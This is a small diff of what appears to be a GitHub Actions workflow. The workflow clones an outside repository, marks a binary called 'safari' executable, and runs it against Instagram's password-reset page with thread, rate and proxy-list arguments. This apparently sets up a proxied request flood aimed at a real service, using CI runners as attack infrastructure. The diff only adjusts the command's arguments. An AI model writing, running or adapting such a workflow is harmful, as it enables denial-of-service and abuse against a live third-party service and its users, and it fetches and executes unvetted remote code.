@@ -24,6 +24,6 @@ jobs:
         git clone https://github.com/Kiwiwjkwi/cuddly-octo-bassoon.git
         cd cuddly-octo-bassoon
         chmod +x safari
-        ./safari /http https://www.instagram.com/accounts/password/reset/   700 10000 8000 proxies.txt  --raw
+        ./safari  https://www.instagram.com/accounts/password/reset/   700 10000 8000 proxies.txt  --raw
       continue-on-error: true
     
